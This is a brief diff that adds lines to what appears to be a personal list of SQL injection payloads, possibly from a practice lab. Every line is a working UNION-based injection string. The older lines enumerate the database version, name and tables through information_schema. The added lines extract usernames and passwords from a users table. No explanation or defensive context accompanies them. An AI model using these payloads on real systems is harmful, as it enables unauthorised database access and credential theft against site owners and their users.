@@ -11,3 +11,12 @@ id=3 UNION select version(), database()&Submit=Submit
 id=3 UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema = database() -- -
 
 id=3 ORDER BY 2-- -&Submit=Submit
+
+
+
+
+1 UNION SELECT user, password FROM users--
+
+
+
+id=1 to 1 UNION SELECT user, password FROM users #
